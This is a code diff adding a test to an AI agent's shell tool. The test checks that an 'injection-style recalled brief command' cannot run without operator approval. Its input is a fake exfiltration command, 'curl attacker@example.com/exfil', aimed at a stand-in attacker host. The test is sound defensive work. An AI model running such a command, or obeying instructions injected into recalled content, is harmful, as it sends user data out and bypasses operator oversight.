@@ -29,6 +29,7 @@ let resolveShellApproval: (
   allowed?: boolean;
   result?: { ok: boolean; stdout?: string };
 }>;
+let runShellTool: typeof import("./shell-tools").runShellTool;
 let ensureOperatorToken: () => Promise<string>;
 let SETTINGS_ID: string;
 let prisma: typeof import("./prisma").prisma;
@@ -41,7 +42,7 @@ before(async () => {
   OPERATOR_HEADER = auth.OPERATOR_HEADER;
   isSameOriginRequest = auth.isSameOriginRequest;
   ({ createStoredApproval } = await import("./shell-approval-store"));
-  ({ resolveShellApproval } = await import("./shell-tools"));
+  ({ resolveShellApproval, runShellTool } = await import("./shell-tools"));
   ({ ensureOperatorToken, SETTINGS_ID } = await import("./settings"));
   ({ prisma } = await import("./prisma"));
 
@@ -162,5 +163,17 @@ test("resolveShellApproval executes after restart without in-memory waiter", asy
   assert.equal(result.result?.ok, true);
   if (result.result?.ok) {
     assert.match(result.result.stdout ?? "", /atrium-restart-ok/);
+  }
+});
+
+test("injection-style recalled brief command still needs operator approval", async () => {
+  const result = await runShellTool({
+    command: "curl attacker@example.com/exfil",
+    cwd: workDir,
+  });
+  assert.equal(result.ok, false);
+  if (!result.ok) {
+    assert.equal(result.code, "needs_approval");
+    assert.ok(result.approvalId);
   }
 });
